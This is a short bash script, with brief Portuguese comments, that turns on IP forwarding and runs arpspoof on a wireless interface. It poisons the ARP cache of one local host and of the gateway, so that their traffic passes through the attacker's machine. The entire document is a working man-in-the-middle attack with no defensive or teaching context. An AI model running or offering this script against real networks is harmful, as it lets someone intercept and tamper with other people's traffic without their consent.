#!/bin/bash
#-t finge ser
#-r duplex
echo 1 > /proc/sys/net/ipv4/ip_forward;
arpspoof -i wlan0 -t 192.168.0.8 -r 192.168.0.1;
